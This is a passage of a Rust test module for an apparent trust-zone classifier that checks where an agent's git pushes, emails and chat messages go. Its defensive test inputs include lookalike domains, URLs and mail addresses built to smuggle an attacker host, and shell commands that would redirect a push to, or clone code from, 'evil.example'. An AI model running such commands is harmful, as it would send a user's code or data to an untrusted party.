            repo: Some(repo),
            ..Base::default()
        }
    }

    fn ctx() -> Context {
        Context::new("/home/me/Documents/dev/app", Workspace::standard("/home/me"))
    }

    fn push(repo: &str) -> Analysis {
        Analysis::new(
            vec![Effect::GitPush {
                repo: repo.to_owned(),
                refname: "refs/heads/feat".to_owned(),
                default_branch: Some(false),
                rewrites: Some(false),
                commits: 1,
            }],
            effects::Certainty::Full,
            Vec::new(),
        )
    }

    fn mail(to: &[&str]) -> Analysis {
        analyze_tool("gmail_send", &json!({ "to": to }))
    }

    #[test]
    fn zones_from_facts() {
        let f = facts();
        assert_eq!(request_zone(&push("github.com/dkat/reins"), &f, &Base::default()).zone, Zone::Mine);
        assert_eq!(request_zone(&push("https://github.com/acme/api.git"), &f, &Base::default()).zone, Zone::Work);
        assert_eq!(request_zone(&push("git@github.com:octo/x.git"), &f, &Base::default()).zone, Zone::Friends);
        assert_eq!(request_zone(&analyze_command("rm -rf target", &ctx()), &f, &Base::default()).zone, Zone::Mine);
        assert_eq!(request_zone(&analyze_command("rm -rf ~/x", &ctx()), &f, &Base::default()).zone, Zone::Outside);
        let r = request_zone(&push("github.com/dkat/reins"), &f, &Base::default());
        assert_eq!(r.resource.as_deref(), Some("dkat/reins"));
    }

    #[test]
    fn unknown_is_outside_and_named() {
        let r = request_zone(&push("github.com/octo/y"), &facts(), &Base::default());
        assert_eq!(r.zone, Zone::Outside);
        assert_eq!(
            r.unknown,
            vec![Unknown {
                kind: FactKind::Owner,
                key: "octo".to_owned()
            }]
        );
        // a placeholder, not a party, is Outside and not asked about
        let r = request_zone(&analyze_tool("gmail_set_vacation", &json!({})), &facts(), &Base::default());
        assert_eq!(r.zone, Zone::Outside);
        assert!(r.unknown.is_empty(), "{:?}", r.unknown);
    }

    #[test]
    fn lookalikes_are_outside() {
        let f = facts();
        assert_eq!(request_zone(&push("github.com/dkat-evil/reins"), &f, &Base::default()).zone, Zone::Outside);
        assert_eq!(request_zone(&push("github.com/DKAT/reins"), &f, &Base::default()).zone, Zone::Mine, "case only");
        assert_eq!(
            request_zone(&push("github.com/dk\u{0430}t/reins"), &f, &Base::default()).zone,
            Zone::Outside,
            "Cyrillic a"
        );
        assert_eq!(request_zone(&mail(&["me@gmail.com.evil.io"]), &f, &Base::default()).zone, Zone::Outside);
        assert_eq!(request_zone(&mail(&["me@gmail.com"]), &f, &Base::default()).zone, Zone::Mine);
        assert_eq!(
            request_zone(&mail(&["x@sub.acme.io"]), &f, &Base::default()).zone,
            Zone::Outside,
            "not a subdomain match"
        );
        assert_eq!(host_zone(&f, "localhost.evil.io").0, Zone::Outside);
        assert_eq!(host_zone(&f, "localhost").0, Zone::Mine);
    }

    #[test]
    fn one_outside_party_makes_it_outside() {
        let f = facts();
        let r = request_zone(&mail(&["me@gmail.com", "x@stranger.io"]), &f, &Base::default());
        assert_eq!(r.zone, Zone::Outside);
        assert_eq!(r.unknown.len(), 1);
        assert_eq!(request_zone(&mail(&["me@gmail.com", "ann@example.com"]), &f, &Base::default()).zone, Zone::Friends);
        let two = Analysis::new(
            [push("github.com/dkat/a").effects, push("github.com/octo/z").effects].concat(),
            effects::Certainty::Full,
            Vec::new(),
        );
        assert_eq!(request_zone(&two, &f, &Base::default()).zone, Zone::Outside);
        assert_eq!(request_zone(&mail(&[]), &f, &Base::default()).zone, Zone::Outside, "nobody named is not nobody");
    }

    #[test]
    fn public_mail_domains_are_never_zoned() {
        let mut f = Facts::default();
        assert!(!f.set(FactKind::Domain, "gmail.com", Zone::Work));
        assert!(!f.set(FactKind::Domain, "", Zone::Work));
        assert!(!f.set(FactKind::Owner, "dk\u{0430}t", Zone::Mine));
        assert!(!f.set(FactKind::Person, &format!("{}@x.io", "a".repeat(300)), Zone::Friends), "too long");
        assert!(f.domains.is_empty() && f.owners.is_empty());
    }

    #[test]
    fn reads_add_no_zone() {
        assert_eq!(
            request_zone(&analyze_command("cat ~/.bashrc", &ctx()), &facts(), &Base::default()).zone,
            Zone::Mine
        );
        assert_eq!(
            request_zone(&analyze_tool("gmail_search", &json!({"q": "x"})), &facts(), &Base::default()).zone,
            Zone::Mine
        );
    }

    #[test]
    fn work_domain_recipients_are_work() {
        assert_eq!(request_zone(&mail(&["Bob <bob@acme.io>"]), &facts(), &Base::default()).zone, Zone::Work);
        assert_eq!(request_zone(&mail(&["BOB@ACME.IO"]), &facts(), &Base::default()).zone, Zone::Work);
        // Only a plain address takes its domain's zone.
        for odd in [
            "evil%attacker.com@acme.io",
            "\"x@attacker.com\"@acme.io",
            "a@b@acme.io",
            "x@attacker.com,y@acme.io",
            "a!b@acme.io",
            "a@acme.io.",
            "a@sub.acme.io",
        ] {
            assert_eq!(request_zone(&mail(&[odd]), &facts(), &Base::default()).zone, Zone::Outside, "{odd}");
        }
    }

    #[test]
    fn only_origin_or_no_remote_is_the_base() {
        let f = facts();
        let mine = base("github.com/dkat/app");
        for cmd in ["git push origin feat/x", "git push"] {
            assert_eq!(request_zone(&analyze_command(cmd, &ctx()), &f, &mine).zone, Zone::Mine, "{cmd}");
        }
        // Another remote: what its URL says, else Outside.
        let other = analyze_command("git push upstream feat/x", &ctx());
        assert_eq!(request_zone(&other, &f, &mine).zone, Zone::Outside);
        let mut remotes = BTreeMap::new();
        remotes.insert("upstream".to_owned(), "git@github.com:acme/app.git".to_owned());
        let with = Base {
            remotes: Some(&remotes),
            ..mine
        };
        assert_eq!(request_zone(&other, &f, &with).zone, Zone::Work);
        remotes.insert("upstream".to_owned(), "https://evil.example/dkat/app".to_owned());
        let with = Base {
            remotes: Some(&remotes),
            ..mine
        };
        assert_eq!(request_zone(&other, &f, &with).zone, Zone::Outside);
        // A remote named like a repository is still a remote.
        let named = analyze_command("git push dkat/app feat/x", &ctx());
        assert_eq!(request_zone(&named, &f, &mine).zone, Zone::Outside);
    }

    #[test]
    fn ambiguous_urls_are_outside() {
        let f = facts();
        for url in [
            "https://evil.example#@github.com/dkat/reins",
            "https://evil.example?@github.com/dkat/reins",
            "https://a@b@github.com/dkat/reins",
            "https://github.com%2fdkat/reins",
            "https://evil.example\\@github.com/dkat/reins",
            "https://github.com:x/dkat/reins",
            "git@evil.example:x@github.com:dkat/reins",
            "github.com/dkat/reins?x",
        ] {
            assert_eq!(request_zone(&push(url), &f, &Base::default()).zone, Zone::Outside, "{url}");
        }
        assert_eq!(
            request_zone(&push("https://user@github.com/dkat/reins.git"), &f, &Base::default()).zone,
            Zone::Mine
        );
        assert_eq!(request_zone(&push("https://github.com:443/dkat/reins"), &f, &Base::default()).zone, Zone::Mine);
    }

    #[test]
    fn recipient_fields_are_each_mailbox() {
        let f = facts();
        // A field naming two people: each on its own, the least trusted wins.
        let r = request_zone(&mail(&["ann@example.com, x@stranger.io"]), &f, &Base::default());
        assert_eq!(r.zone, Zone::Outside);
        assert_eq!(r.parts, vec!["ann@example.com".to_owned(), "x@stranger.io".to_owned()]);
        assert_eq!(
            request_zone(&mail(&["Ann <ann@example.com>; me@gmail.com"]), &f, &Base::default()).zone,
            Zone::Friends
        );
        // The last angle brackets don't decide.
        for odd in [
            "x@stranger.io <ann@example.com>",
            "Ann <x@stranger.io> <ann@example.com>",
            "<ann@example.com",
            "ann@example.com>",
            "\"Ann\" <ann@example.com>",
        ] {
            assert_eq!(request_zone(&mail(&[odd]), &f, &Base::default()).zone, Zone::Outside, "{odd}");
        }
    }

    #[test]
    fn facts_are_keyed_by_host() {
        let f = facts();
        assert_eq!(
            request_zone(&push("https://attacker.example/dkat/reins"), &f, &Base::default()).zone,
            Zone::Outside
        );
        assert_eq!(request_zone(&push("gitlab.com/dkat/reins"), &f, &Base::default()).zone, Zone::Outside);
        assert_eq!(
            request_zone(&push("ssh://git@github.com:22/dkat/reins.git"), &f, &Base::default()).zone,
            Zone::Mine
        );
        // A bare owner/name is GitHub's only where a GitHub tool says so.
        assert_eq!(request_zone(&push("dkat/reins"), &f, &Base::default()).zone, Zone::Outside);
        let gh = Base {
            bare_host: Some(GITHUB),
            ..Base::default()
        };
        assert_eq!(request_zone(&push("dkat/reins"), &f, &gh).zone, Zone::Mine);
        let gitlab = Base {
            bare_host: Some("gitlab.com"),
            ..Base::default()
        };
        let r = request_zone(&push("dkat/reins"), &f, &gitlab);
        assert_eq!(r.zone, Zone::Outside, "GitLab doesn't use GitHub's facts");
        assert_eq!(r.unknown[0].key, "gitlab.com/dkat");
    }

    #[test]
    fn chats_are_known_by_id_only() {
        let mut f = facts();
        let tg = |to: &str| analyze_tool("telegram_send", &json!({ "chat": to }));
        for name in ["me", "self", "Saved Messages"] {
            let r = request_zone(&tg(name), &f, &Base::default());
            assert_eq!(r.zone, Zone::Outside, "{name}");
            assert!(r.unknown.is_empty(), "a name is never a question: {name}");
        }
        let r = request_zone(&tg("123456"), &f, &Base::default());
        assert_eq!((r.zone, r.unknown[0].kind), (Zone::Outside, FactKind::Chat));
        f.set(FactKind::Chat, "123456", Zone::Mine);
        assert_eq!(request_zone(&tg("123456"), &f, &Base::default()).zone, Zone::Mine);
        assert_eq!(request_zone(&tg("@pal"), &f, &Base::default()).zone, Zone::Outside);
    }

    #[test]
    fn telegram_parties_are_their_numeric_ids() {
        let mut f = facts();
        let tg = |to: &str| analyze_tool("telegram_send", &json!({ "chat": to }));
        // A handle or a name (what an agent writes) is never a fact: the phone resolves it to the chat's id first.
        f.people.insert("@pal".to_owned(), Zone::Friends);
        f.chats.insert("@pal".to_owned(), Zone::Friends);
        for written in ["@pal", "Pal", "+15550100"] {
            let r = request_zone(&tg(written), &f, &Base::default());
            assert_eq!(r.zone, Zone::Outside, "{written}");
            assert!(r.unknown.is_empty(), "only an id is a question: {written}");
        }
        // Ids: a user's, and a group's (negative).
        for id in ["123456", "-1001234567890"] {
            let r = request_zone(&tg(id), &f, &Base::default());
            assert_eq!(
                r.unknown,
                [Unknown {
                    kind: FactKind::Chat,
                    key: id.to_owned()
                }],
                "{id}"
            );
            f.set(FactKind::Chat, id, Zone::Friends);
            assert_eq!(request_zone(&tg(id), &f, &Base::default()).zone, Zone::Friends, "{id}");
        }
        // Texts keep phone numbers as their parties.
        f.set(FactKind::Person, "+15550100", Zone::Friends);
        let sms = analyze_tool("sms_send", &json!({ "to": "+15550100", "text": "hi" }));
        assert_eq!(request_zone(&sms, &f, &Base::default()).zone, Zone::Friends);
    }

    #[test]
    fn github_owners_are_known_by_their_stable_id() {
        let push = |repo: &str| analyze_tool("github_create_issue", &json!({ "repo": repo, "title": "x" }));
        let base = Base {
            bare_host: Some(GITHUB),
            ..Base::default()
        };
        let mut f = Facts::default();
        f.set_github_owner("583231", "dkat", Zone::Mine);
        assert_eq!(f.owners.get("#583231"), Some(&Zone::Mine));
        assert_eq!(f.label(FactKind::Owner, "#583231"), Some("dkat"));
        // GitHub says who `dkat` is now: the same account → Mine.
        f.github_ids.insert("dkat".to_owned(), "583231".to_owned());
        assert_eq!(request_zone(&push("dkat/reins"), &f, &base).zone, Zone::Mine);
        // The login now belongs to someone else (the owner renamed theirs): Outside, whatever the label says.
        f.github_ids.insert("dkat".to_owned(), "999".to_owned());
        let r = request_zone(&push("dkat/reins"), &f, &base);
        assert_eq!(r.zone, Zone::Outside);
        assert_eq!(
            r.unknown,
            [Unknown {
                kind: FactKind::Owner,
                key: "dkat".to_owned()
            }]
        );
        // Not resolved (offline): Outside, and not asked again about an owner the facts name.
        f.github_ids.clear();
        let r = request_zone(&push("dkat/reins"), &f, &base);
        assert_eq!((r.zone, r.unknown.len()), (Zone::Outside, 0));
        // The resolutions are what this request was evaluated with, not part of the policy.
        let mut g = f.clone();
        g.github_ids.insert("dkat".to_owned(), "583231".to_owned());
        assert_eq!(serde_json::to_string(&f).unwrap(), serde_json::to_string(&g).unwrap());
        // Facts written before labels existed hash as before (an org's signed policy keeps its hash).
        assert_eq!(
            serde_json::to_string(&Facts::default()).unwrap(),
            r#"{"owners":{},"repos":{},"own_addresses":[],"domains":{},"people":{},"hosts":{},"chats":{}}"#
        );
    }

    #[test]
    fn parts_name_every_party() {
        let r = request_zone(&mail(&["me@gmail.com", "ann@example.com"]), &facts(), &Base::default());
        assert_eq!(r.parts, vec!["ann@example.com".to_owned(), "me@gmail.com".to_owned()]);
    }

    #[test]
    fn where_a_command_acts() {
        let (cwd, top, home) = ("/home/me/dev/app/src", Some("/home/me/dev/app"), "/home/me");
        for c in [
            "git -C ../other push origin main",
            "git --git-dir=/x/.git push",
            "GIT_DIR=/x/.git git push origin",
            "git push origin && cd /home/me/dev/other && git push origin",
            "cd && git push",
            "cd $DIR && git push",
            "cd /a && cd /b && git push",
            "git -c remote.origin.url=https://evil.example/x push origin",
            "git -cremote.origin.pushurl=x push origin",
            "git --config-env=remote.origin.url=EVIL push origin",
            "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.url GIT_CONFIG_VALUE_0=x git push origin",
            "GIT_CONFIG_PARAMETERS=x git push",
            // Back in `cwd`'s repository after a leading `cd` elsewhere: two repositories.
            "cd ~/dev/other && git status; cd /home/me/dev/app && git push origin feat/x",
            // A worktree added, but the `cd` may run when git failed (the folder may be another repository).
            "git worktree add ~/tmp/w; cd ~/tmp/w && git push origin feat/x",
            "git worktree add ~/tmp/w || cd ~/tmp/w && git push origin feat/x",
            "! git worktree add ~/tmp/w && cd ~/tmp/w && git push origin feat/x",
            "git worktree add ~/tmp/w | cat && cd ~/tmp/w && git push origin feat/x",
            "echo 'git worktree add ~/tmp/w &&' && cd ~/tmp/w && git push origin feat/x",
            "git worktree add ~/tmp/other && cd ~/tmp/w && git push origin feat/x",
            "git worktree add --unknown ~/tmp/w && cd ~/tmp/w && git push origin feat/x",
            "git -C ~/dev/other worktree add ~/tmp/w && cd ~/tmp/w && git push origin feat/x",
            "for x in a; do git worktree add ~/tmp/w && cd ~/tmp/w; done; git push origin feat/x",
            "git worktree add ~/tmp/w && cd ~/tmp/w; cd ~/tmp/w && git push origin feat/x",
            "git worktree add ~/tmp/w && cd ~/tmp/w; builtin cd ~/tmp/w && git push origin feat/x",
            "git worktree add ~/tmp/w && echo 'cd ~/tmp/w' && cd ~/tmp/w && git push origin feat/x",
            // An `||` before the add: it may be skipped while the `cd` runs.
            "true || git worktree add ~/tmp/w && cd ~/tmp/w && git push origin feat/x",
            "git status || ! true && git worktree add ~/tmp/w && cd ~/tmp/w && git push origin feat/x",
            "true; git worktree add ~/tmp/w; cd ~/tmp/w && git push origin feat/x",
            // Anything between the add and the `cd` could make the folder again.
            "git worktree add ~/tmp/w && rm -rf ~/tmp/w && git clone https://evil.example/x ~/tmp/w && cd ~/tmp/w && git push origin feat/x",
            "git worktree add ~/tmp/w && true && cd ~/tmp/w && git push origin feat/x",
            "git worktree add /home/me/tmp/w && git status && cd /home/me/tmp/w && git push",
            // A relative `cd` that may reach the folder too.
            "git worktree add ~/tmp/w && cd ~/tmp/w; cd .. && cd w && git push origin feat/x",
            // Other ways to move or to point git elsewhere.
            "pushd ~/dev/other && popd && git push origin feat/x",
            "cd /home/me/dev/app/lib && popd; git push origin feat/x",
            "env -C ~/dev/other git push origin feat/x",
            "env --chdir=/home/me/dev/other git push origin feat/x",
            "cd app other && git push origin feat/x",
            "CDPATH=/home/me/dev cd other && git push origin feat/x",
            "export CDPATH=/home/me/dev; cd lib && git push origin feat/x",
            "GIT_COMMON_DIR=/x git push origin feat/x",
            "HOME=/tmp/evil git push origin feat/x",
            "export XDG_CONFIG_HOME=/tmp/evil; git push origin feat/x",
            // A quoted or escaped `~` is a folder named `~`, not the home folder.
            "git worktree add '~/tmp/w' && cd ~/tmp/w && git push origin feat/x",
            "git worktree add ~/tmp/w && cd '~/tmp/w' && git push origin feat/x",
            "git worktree add ~/tmp/w && cd \\~/tmp/w && git push origin feat/x",
            "cd '~/dev/other' && git push origin feat/x",
            "cd \"~/dev/other\" && git push origin feat/x",
        ] {
            assert_eq!(repo_at(c, cwd, top, home), RepoAt::Unknown, "{c}");
        }
        // A worktree the command just added, then moved to with `&&` only: the same repository.
        for c in [
            "git worktree add -q --detach ~/tmp/w && cd ~/tmp/w && git push origin feat/x",
            "git fetch -q origin x && git worktree add -q -B x ~/tmp/w origin/x && cd ~/tmp/w && git push origin x; ls",
            "cd /home/me/dev/app && git worktree add /home/me/tmp/w && cd /home/me/tmp/w && git push",
            "git fetch && ! false && git worktree add ~/tmp/w && cd ~/tmp/w && git push origin feat/x",
        ] {
            assert_eq!(repo_at(c, cwd, top, home), RepoAt::Cwd, "{c}");
        }
        assert_eq!(
            repo_at("cd ~/dev/other && git worktree add ~/tmp/w && cd ~/tmp/w && git push origin x", cwd, top, home),
            RepoAt::Dir("/home/me/dev/other".to_owned())
        );
        // Each `cd` from where the one before left: `cd lib && cd ..` stays in the repository, `cd ../.. && cd app` too.
        assert_eq!(repo_at("cd /home/me/dev/app/lib && cd .. && git push origin x", cwd, top, home), RepoAt::Cwd);
        assert_eq!(repo_at("cd ~/dev/other && cd src && git push origin x", cwd, top, home), RepoAt::Unknown);
        assert_eq!(repo_at("cd .. 2>/dev/null && git push origin x", cwd, top, home), RepoAt::Cwd);
        for c in [
            "git push origin main",
            "cd .. && git push origin main",
            "cd /home/me/dev/app/lib && gh pr create",
            "make -C build",
        ] {
            assert_eq!(repo_at(c, cwd, top, home), RepoAt::Cwd, "{c}");
        }
        assert_eq!(
            repo_at("cd ~/dev/other && git push origin", cwd, top, home),
            RepoAt::Dir("/home/me/dev/other".to_owned())
        );
        assert_eq!(
            repo_at("pushd ../../other; git push", cwd, top, home),
            RepoAt::Dir("/home/me/dev/other".to_owned())
        );
    }

    #[test]
    fn origin_is_the_base_repository() {
        let a = analyze_command("git push origin feat/x", &ctx());
        let f = facts();
        assert_eq!(request_zone(&a, &f, &base("github.com/dkat/app")).zone, Zone::Mine);
        assert_eq!(request_zone(&a, &f, &Base::default()).zone, Zone::Outside, "no repository known: Outside");
        let comment = analyze_tool("github_comment", &json!({"body": "hi"}));
        assert_eq!(request_zone(&comment, &f, &base("github.com/dkat/app")).zone, Zone::Mine, "this repository");
        assert_eq!(request_zone(&comment, &f, &Base::default()).zone, Zone::Outside);
    }
}
